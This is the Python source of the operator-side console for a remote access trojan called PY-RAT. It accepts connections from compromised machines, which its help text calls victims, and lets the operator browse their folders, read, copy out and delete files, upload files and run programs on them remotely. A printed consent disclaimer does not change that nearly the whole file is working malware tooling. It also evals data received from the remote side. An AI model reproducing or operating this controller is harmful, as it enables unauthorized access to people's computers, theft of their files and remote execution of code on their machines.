import socket
import os
from uuid import uuid4
import threading

os.system('')

print('\u001b[38;2;255;255;255m')
print('\u001b[40m')

TITLE = \
"""
 _______   __      __       _______    ______   ________ 
/       \ /  \    /  |     /       \  /      \ /        |
$$$$$$$  |$$  \  /$$/      $$$$$$$  |/$$$$$$  |$$$$$$$$/ 
$$ |__$$ | $$  \/$$/______ $$ |__$$ |$$ |__$$ |   $$ |   
$$    $$/   $$  $$//      |$$    $$< $$    $$ |   $$ |   
$$$$$$$/     $$$$/ $$$$$$/ $$$$$$$  |$$$$$$$$ |   $$ |   
$$ |          $$ |         $$ |  $$ |$$ |  $$ |   $$ |   
$$ |          $$ |         $$ |  $$ |$$ |  $$ |   $$ |   
$$/           $$/          $$/   $$/ $$/   $$/    $$/    
"""

HELP_MSG = \
"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                 COMMANDS                                                                 ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║                                                                                                                                          ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ DIRECTORY                                                                                                                                ║
╠════════════════════════╦═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ cd [Directory, ..]     ║ Append the directory to the current directory or remove the most specific directory from the current directory. ║
╠════════════════════════╬═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ goto [Absolute Path]   ║ Set the current directory to the absolute path.                                                                 ║
╠════════════════════════╬═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ ls                     ║ List all files in a directory.                                                                                  ║
╠════════════════════════╩═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║                                                                                                                                          ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ FILES                                                                                                                                    ║
╠════════════════════════╦═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ size [File,Directory]  ║ Returns the number of bytes that the selected file or directory is uses.                                        ║
╠════════════════════════╬═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ read [File]            ║ Returns the content of the file. Press CTRL+C to cancel.                                                        ║
╠════════════════════════╬═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ write [File]           ║ Writes the chosen file to the current chosen directory.                                                         ║
╠════════════════════════╬═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ rm [File]              ║ Removes the chosen file.                                                                                        ║
╠════════════════════════╬═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ copy [File]            ║ Copies the chosen file to the your current working directory.                                                   ║
╠════════════════════════╬═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ run [File]             ║ Runs the chosen file with it's default application.                                                             ║
╠════════════════════════╬═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ mkdir [Directory Name] ║ Creates a directory in the current working directory with directory name.                                       ║
╠════════════════════════╬═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ rmdir [Directory Name] ║ Removes a directory in the current working directory with directory name.                                       ║
╠════════════════════════╩═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║                                                                                                                                          ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ MISC                                                                                                                                     ║
╠════════════════════════╦═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ help                   ║ Lists all commands.                                                                                             ║
╠════════════════════════╬═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ cls                    ║ Clears the terminal.                                                                                            ║
╠════════════════════════╬═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ exit                   ║ Closes the connection with the victim and allows you to connect to a new victim.                                ║
╚════════════════════════╩═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""
CONNECTIONS = {}

def recvall(connection):

    data = ''
    
    data += connection.recv(4096).decode()

    dataSplit, data = data.split('|', 1)

    if dataSplit in data:
            data = data.replace('|' + dataSplit, '')
            return data

    while True:

        data += connection.recv(4096).decode()

        if dataSplit in data:
            data = data.replace('|' + dataSplit, '')
            return data

def getMsgWithDataSplit(msg):

    dataSplit = str(uuid4())

    return (dataSplit + '|' + msg + '|' + dataSplit).encode()

def makeConnections():

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

        try:
            s.bind((ADDR, PORT))
        except:
            raise ValueError('INVALID BINDING ADDRESS OR PORT. PLEASE RESTART PY-RAT!')

        while True:

            s.listen()

            connection, address = s.accept()

            CONNECTIONS[address[0]] = connection

def testConnection(ADDR, PORT):

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((ADDR, int(PORT)))

        return True

    except:
        return False

def clearTerminal():
    try:
        os.system('cls')
    except:
        os.system('clear')

while True:
    autoDetectAddr = input(f'DO YOU WANT TO USE PY-RAT\'S AUTO DETECTED IP ADDRESS ({socket.gethostbyname(socket.gethostname())}) (Y/N) : ').strip()
    if autoDetectAddr.lower() == 'y':
        ADDR = socket.gethostbyname(socket.gethostname())
        while True:
            choicePort = input('ENTER A VALID PORT NUMBER (CLIENTS WILL USE THIS ADDRESS TO CONNECT) : ').strip()
            if testConnection(ADDR, choicePort):
                PORT = int(choicePort)
                break
            else:
                print('INVALID PORT! ENTER A VALID PORT NUMBER (0 TO 65536). PORT CANNOT ALREADY BE IN USE!')
        break
    else:
        while True:
            choiceAddr = input('ENTER A VALID IP ADDRESS (LOCAL ADDRESS) : ').strip()
            choicePort = input('ENTER A VALID PORT NUMBER (CLIENTS WILL USE THIS ADDRESS TO CONNECT) : ').strip()
            if testConnection(choiceAddr, choicePort):
                ADDR = choiceAddr
                PORT = int(choicePort)
                break
            else:
                print('INVALID IP ADDRESS OR PORT! ENTER A VALID IP ADDRESS (LOCAL ADDRESS) OR VALID PORT NUMBER (0 TO 65536). PORT CANNOT ALREADY BE IN USE!')
        break

clearTerminal()

print('\u001b[38;2;74;246;38m' + TITLE + '\u001b[38;2;255;0;0m')
print('DISCLAIMER: The use of PY-RAT can be a serious violation of laws, including the Computer Fraud and Abuse Act and other federal or provincial laws. It is important to only use PY-RAT with the consent of the owner of the computer. Unauthorized access or use of someone else\'s computer or network without permission could result in criminal charges and severe penalties. Use of PY-RAT for any illegal or unethical purpose is strictly prohibited and can result in serious consequences. By using these tools, you acknowledge and agree to accept full responsibility for your actions and any consequences that may result from their use.')
print('\u001b[38;2;0;0;255m\nFULL CREDITS GO TO ALEX JANDO\n')
print(r'GITHUB: https://github.com/Alex-Jando/PY-RAT')
print('\u001b[38;2;255;255;255m')
print(f'RAT HOSTED AT \u001b[38;2;0;0;255m{ADDR}:{PORT}\u001b[38;2;255;255;255m (LOCAL ADDRESS)')

CONNECTIONS_THREAD = threading.Thread(target = makeConnections, daemon = True)
CONNECTIONS_THREAD.start()

while True:

    print('\nALL CURRENT CONNECTIONS :\n')
    print(''.join([f'{int(index) + 1} - {address}\n' for index, address in enumerate(CONNECTIONS)]))
    print('\nType "refresh" to refresh the connections...')
    print('Type "cls" to clear the terminal...')
    print('Type "exit" to exit the program...\n')

    connectionChoice = input('Enter the address you want to connect to >>> ').strip()

    if connectionChoice.lower() == 'exit':
        for address in CONNECTIONS:
            CONNECTIONS[address].close()
        break

    elif connectionChoice.lower() == 'cls':
        clearTerminal()

    elif connectionChoice.lower() == 'refresh':
        deadConns = []
        for address in CONNECTIONS:
            try:
                CONNECTIONS[address].sendall(getMsgWithDataSplit('Refresh'))
                recvall(CONNECTIONS[address])
            except:
                deadConns.append(address)

        for deadConn in deadConns:
            CONNECTIONS.pop(deadConn)

    else:
        try:
            connectionChoice = int(connectionChoice) - 1

            CONNECTION_ADDR = list(CONNECTIONS.keys())[connectionChoice]

            try:

                CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('EstablishConnection'))

            except:

                print(f'{CONNECTION_ADDR} has disconected')
                CONNECTIONS.pop(CONNECTION_ADDR)
                CONNECTION_ADDR = ''

            CURRENT_CONNECTION_DIRECTORY = recvall(CONNECTIONS[CONNECTION_ADDR]).strip('\\')

            print(f'\nCONNECTED TO: {CONNECTION_ADDR}\n')

            try:

                while True:

                    if not CONNECTION_ADDR:
                        break

                    command = input(f'{CURRENT_CONNECTION_DIRECTORY} >>> ').strip().lower().split(' ')[0]

                    if command == 'help':
                        print(HELP_MSG)

                    elif command == 'ls':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('ls'))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print('INVALID PERMISSIONS OR DIRECTORY!')
                        else:
                            print(f'ALL FILES IN: {CURRENT_CONNECTION_DIRECTORY}\n')
                            print(''.join([f'{directory}\n' for directory in eval(data)]))

                    elif command == 'cd':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('cd'))
                        folder = input('Enter the folder >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(folder)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print('INVALID PERMISSIONS OR DIRECTORY!')
                        else:
                            CURRENT_CONNECTION_DIRECTORY = data

                    elif command == 'goto':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('goto'))
                        directory = input('Enter the directory >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(directory)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print('INVALID PERMISSIONS OR DIRECTORY!')
                        else:
                            CURRENT_CONNECTION_DIRECTORY = data

                    elif command == 'size':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('size'))
                        file = input('Enter the file >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print('INVALID PERMISSIONS OR DIRECTORY!')
                        else:
                            print(f'The size of {file} is {data} bytes')

                    elif command == 'read':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('read'))
                        file = input('Enter the file >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        print(f'Contents of {file} :\n')
                        if data == 'ERROR':
                            print('INVALID PERMISSIONS OR DIRECTORY!')
                        else:
                            try:
                                print(data + '\n')
                            except KeyboardInterrupt:
                                print(f'\n\nCRTL+C PRESSED!\n\n')

                    elif command == 'write':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('write'))
                        fileName = input('Enter the file >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(fileName))
                        try:
                            with open(fileName, 'r') as f:
                                file = f.read()

                            CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(file))

                            fileSavePath = recvall(CONNECTIONS[CONNECTION_ADDR])

                            if fileSavePath == 'ERROR':
                                print(f'FAILED TO COPY {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                            else:
                                print(f'File successfully written and saved to {fileSavePath}')
                        except:
                            try:
                                with open(fileName, 'rb') as f:
                                    file = f.read()

                                CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))

                                fileSavePath = recvall(CONNECTIONS[CONNECTION_ADDR])

                                if fileSavePath == 'ERROR':
                                    print(f'FAILED TO COPY {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                                else:
                                    print(f'File successfully written and saved to {fileSavePath}')
                            except:
                                CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('ERROR'))
                                print(f'File {fileName} not found or is unreadable!')                        

                    elif command == 'copy':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('copy'))
                        file = input('Enter the file >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print(f'FAILED TO COPY {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                        else:
                            try:
                                if type(eval(data)) == bytes:
                                    with open(file, 'wb') as f:
                                        f.write(eval(data))
                                else:
                                    with open(file,'w') as f:
                                        f.write(data)
                            except:
                                with open(file,'w') as f:
                                        f.write(data)

                            print(f'File copied and saved successfully to {os.path.join(os.getcwd(), file)}!')

                    elif command == 'run':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('run'))
                        file = input('Enter the file >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print(f'FAILED TO RUN {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                        else:
                            print('File ran successfully')

                    elif command == 'rm':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('rm'))
                        file = input('Enter the file >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print(f'FAILED TO REMOVE {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                        else:
                            print('File deleted successfully')

                    elif command == 'mkdir':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('mkdir'))
                        folder = input('Enter the folder >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(folder)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print(f'FAILED TO CREATE {folder}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                        else:
                            print(f'Folder {folder} created successfully')
                    
                    elif command == 'rmdir':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('rmdir'))
                        folder = input('Enter the folder >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(folder)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print(f'FAILED TO REMOVE {folder}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                        else:
                            print(f'Folder {folder} removed successfully')

                    elif command == 'cls':
                        clearTerminal()

                    elif command == 'exit':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('CloseConnection'))
                        CONNECTION_ADDR = ''
                        CURRENT_CONNECTION_DIRECTORY = ''
                        break

                    else:
                        print(f'COMMAND: {command} IS INVALID')
                        print(HELP_MSG)

            except:
                CONNECTION_ADDR = ''
                CURRENT_CONNECTION_DIRECTORY = ''
                CONNECTIONS.pop(CONNECTION_ADDR)
                print('\nCONNECTION WAS FORCED CLOSED\n')

        except:
            print('\nPLEASE CHOOSE A VAILD CONNECTION!\n')
